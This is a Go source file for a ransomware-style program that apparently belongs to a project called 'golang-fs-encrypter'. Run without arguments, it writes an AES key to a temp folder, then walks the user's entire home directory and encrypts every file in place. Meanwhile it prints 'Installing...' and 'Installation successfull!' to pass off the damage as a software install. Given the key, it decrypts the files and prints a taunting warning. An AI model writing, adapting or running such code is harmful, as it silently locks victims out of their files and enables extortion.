package main

import (
	"encoding/hex"
	"fmt"
	"golang-fs-encrypter/internal/crypto"
	"golang-fs-encrypter/internal/files"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"sync"
)

const (
	MODE_ENCRYPT = iota
	MODE_DECRYPT
	KEY_HEX_LENGTH = 32
	KEY_FILENAME = "key.key"
)

func main() {
	var (
		key     []byte
		mode    int
		homeDir string
		keyFilePath  string
		cipher  crypto.Cipher
		err     error
	)

	homeDir, err = os.UserHomeDir()
	if err != nil {
		return
	}

	switch runtime.GOOS {
	case "linux":
		keyFilePath = "/tmp/" + KEY_FILENAME
	case "windows":
		keyFilePath = homeDir + "\\AppData\\Local\\Temp\\" + KEY_FILENAME
	}

	// Uncomment for testing
	// homeDir = "./dir"
	// keyDir = "./"

	if len(os.Args) == 2 {
		mode = MODE_DECRYPT
		key, err = hex.DecodeString(os.Args[1])
		if err != nil {
			fmt.Println("Bad key", err)
		}
		fmt.Println("Decoding your files...")
	} else {
		mode = MODE_ENCRYPT
		fmt.Println("Installing...")
		key = crypto.GenerateBytes(KEY_HEX_LENGTH)
		keyHex := hex.EncodeToString(key)

		if err = files.WriteFile(keyFilePath, []byte(keyHex)); err != nil {
			return
		}
	}

	cipher, err = crypto.NewAESGCM(key)
	if err != nil {
		return
	}

	execFilePath, err := os.Executable()
	if err != nil {
		return
	}

	var wg sync.WaitGroup

	filepath.WalkDir(homeDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() || path == execFilePath || path == keyFilePath {
			return nil
		}

		wg.Add(1)
		go func(path string) {
			defer wg.Done()

			bytesBefore, err := files.ReadFile(path)
			if err != nil {
				return
			}
	
			var bytesAfter []byte
	
			switch mode {
			case MODE_ENCRYPT:
				bytesAfter, err = cipher.EncryptBytes(bytesBefore)
			case MODE_DECRYPT:
				bytesAfter, err = cipher.DecryptBytes(bytesBefore)
			}
			if err != nil {
				return
			}
			files.RewriteFile(path, bytesAfter)
		}(path)

		return nil
	})	
	
	wg.Wait()

	switch mode {
	case MODE_ENCRYPT:
		fmt.Println("Installation successfull!")
	case MODE_DECRYPT:
		fmt.Println("Your files are now decrypted. Next time be aware of what files you're running!")
	}
}
